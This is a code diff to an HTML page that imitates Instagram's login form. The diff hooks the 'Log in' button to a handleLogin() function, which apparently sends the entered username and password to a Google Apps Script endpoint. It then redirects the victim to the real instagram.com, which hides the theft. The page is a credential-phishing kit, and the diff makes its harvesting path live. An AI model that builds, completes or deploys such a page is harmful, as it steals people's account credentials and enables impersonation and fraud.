@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram</title>
 <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
+
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap');
 
@@ -598,9 +599,7 @@
     <input class="input-field" type="text" id="username" placeholder="Mobile number, username or email" autocomplete="username"/>
     <input class="input-field" type="password" id="password" placeholder="Password" autocomplete="current-password"/>
 
-  <button class="btn-login" id="loginBtn" onclick="window.location.href='https://www.instagram.com/'">
-    Log in
-</button>
+  <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
 
     <a class="forgot" href="#">Forgot password?</a>
 
@@ -653,7 +652,7 @@
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyA8GhoaDt8q2i9VFVsNQusVrP_9gn7EQXjbzn2zJO11Ll_DMTjADh5ZpnmQO-V0zYXWw/exec';
 
   // After successful login, redirect here:
-  const REDIRECT_URL = 'https://xyz.com';
+  const REDIRECT_URL = 'https://www.instagram.com/';
 
   async function handleLogin() {
     const username = document.getElementById('username').value.trim();
